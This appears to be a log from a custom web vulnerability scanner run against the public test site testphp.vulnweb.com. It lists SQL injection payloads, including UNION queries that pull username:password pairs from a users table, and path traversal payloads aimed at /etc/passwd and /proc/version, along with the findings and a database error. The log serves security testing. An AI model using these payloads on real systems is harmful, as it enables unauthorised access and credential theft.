+2025-02-01 18:31:28,759 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==')) OR (('1'='1
+2025-02-01 18:31:28,979 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==")) OR (("1"="1
+2025-02-01 18:31:29,205 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1' ORDER BY 1--+
+2025-02-01 18:31:29,425 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1' UNION SELECT 1,2,3--+
+2025-02-01 18:31:29,646 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1' UNION ALL SELECT NULL,NULL,CONCAT(username,0x3a,password) FROM users--
+2025-02-01 18:31:29,862 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1 OR 1=CONVERT(int, @@version)
+2025-02-01 18:31:30,079 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(75),CHAR(76),CHAR(77))--
+2025-02-01 18:31:30,297 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1' AND ERROR_MESSAGE()--
+2025-02-01 18:31:30,514 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, CONCAT(username,0x3a,password) FROM users--
+2025-02-01 18:31:30,733 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, @@version--
+2025-02-01 18:31:30,952 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, CURRENT_USER--
+2025-02-01 18:31:31,170 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, USER()--
+2025-02-01 18:31:31,387 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, DATABASE()--
+2025-02-01 18:31:31,607 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, SCHEMA_NAME()--
+2025-02-01 18:31:31,827 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==1' AND 1=0 UNION ALL SELECT NULL, NULL, VERSION()--
+2025-02-01 18:31:32,045 - INFO - Vulnerabilities found in template: SQL Injection
+2025-02-01 18:31:32,045 - INFO - Scanning completed for SQL Injection! Time elapsed: 126.36 seconds
+2025-02-01 18:31:32,046 - INFO - Vulnerability found in template app/vuln_templates/A03/sqliparam.py
+2025-02-01 18:31:32,063 - INFO - Scanning Local File Inclusion (LFI) (Total payloads: 2)
+2025-02-01 18:31:32,063 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==../../etc/passwd
+2025-02-01 18:31:32,562 - INFO - Scanning parameter: http://testphp.vulnweb.com/artists.php?artist==/../../../../../../../../../../proc/version
+2025-02-01 18:31:32,787 - INFO - Scanning parameter: http://testphp.vulnweb.com/listproducts.php?artist==../../etc/passwd
+2025-02-01 18:31:33,012 - INFO - Scanning parameter: http://testphp.vulnweb.com/listproducts.php?artist==/../../../../../../../../../../proc/version
+2025-02-01 18:31:33,236 - INFO - Scanning parameter: http://testphp.vulnweb.com/listproducts.php?cat==../../etc/passwd
+2025-02-01 18:31:33,461 - INFO - Scanning parameter: http://testphp.vulnweb.com/listproducts.php?cat==/../../../../../../../../../../proc/version
+2025-02-01 18:31:33,686 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==../../etc/passwd
+2025-02-01 18:31:33,912 - INFO - Scanning parameter: http://testphp.vulnweb.com/showimage.php?file==/../../../../../../../../../../proc/version
+2025-02-01 18:31:34,140 - WARNING - WARNING - Potential vulnerability found at http://testphp.vulnweb.com/showimage.php?file==/../../../../../../../../../../proc/version
+2025-02-01 18:31:34,145 - ERROR - Error adding vulnerability: (pymysql.err.DataError) (1406, "Data too long for column 'cwe_code' at row 1")
+[SQL: INSERT INTO vulnerabilities (id, name, vulnerability_type, details, severity, cvss_score, endpoint, scan_name, full_description, remediation, cwe_code, cve_code, cvss_metrics, created_at) VALUES (%(id)s, %(name)s, %(vulnerability_type)s, %(details)s, %(severity)s, %(cvss_score)s, %(endpoint)s, %(scan_name)s, %(full_description)s, %(remediation)s, %(cwe_code)s, %(cve_code)s, %(cvss_metrics)s, %(created_at)s)]
+[parameters: {'id': 'd8f1799c-49b3-4383-9246-5b4ee3fd7c1e', 'name': 'Local File Inclusion (LFI)', 'vulnerability_type': 'A05 - Security Misconfiguration', 'details': 'Local File Inclusion (LFI) vulnerabilities occur when an application improperly processes user-supplied input to include local files from the server’ ... (89 characters truncated) ... ve system configurations, or escalate the attack to Remote Code Execution (RCE) under certain conditions, potentially compromising the entire server.', 'severity': 'Critical', 'cvss_score': '9.8', 'endpoint': 'http://testphp.vulnweb.com/showimage.php?file==/../../../../../../../../../../proc/version', 'scan_name': 'test1', 'full_description': 'Local File Inclusion (LFI) is a critical vulnerability that occurs when an application fails to properly validate or sanitize user input before inclu ... (104 characters truncated) ... eters and gain unauthorized access to files such as `/etc/passwd`, web server configuration files, sensitive application logs, or other system files.', 'remediation': 'Ensure that all user-supplied input, especially file path parameters, is validated to ensure only valid file names and paths are accepted.', 'cwe_code': 'CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ("PHP Remote File Inclusion")', 'cve_code': '', 'cvss_metrics': 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H', 'created_at': datetime.datetime(2025, 2, 1, 18, 31, 34, 143996)}]
+(Background on this error at: https://sqlalche.me/e/20/9h9h)
+2025-02-01 18:31:34,146 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==../../etc/passwd
+2025-02-01 18:31:34,368 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?p==/../../../../../../../../../../proc/version
+2025-02-01 18:31:34,590 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==../../etc/passwd
+2025-02-01 18:31:34,814 - INFO - Scanning parameter: http://testphp.vulnweb.com/product.php?pic==/../../../../../../../../../../proc/version
+2025-02-01 18:31:35,038 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==../../etc/passwd
+2025-02-01 18:31:35,260 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/?pp==/../../../../../../../../../../proc/version
+2025-02-01 18:31:35,484 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==../../etc/passwd
+2025-02-01 18:31:35,707 - INFO - Scanning parameter: http://testphp.vulnweb.com/hpp/params.php?pp==/../../../../../../../../../../proc/version
+2025-02-01 18:31:35,928 - INFO - Vulnerabilities found in template: Local File Inclusion (LFI)
+2025-02-01 18:31:35,928 - INFO - Scanning completed for Local File Inclusion (LFI)! Time elapsed: 130.24 seconds
+2025-02-01 18:31:35,929 - INFO - Vulnerability found in template app/vuln_templates/A03/lfi.py
+2025-02-01 18:31:35,945 - ERROR - Error during scan with template app/vuln_templates/A06/phpversion.py: For 'wordlist' payload_type, 'payload' must be a list
+2025-02-01 18:31:35,953 - INFO - Scan Completed! Scan started at 18:29:25 and ends at 18:31:35
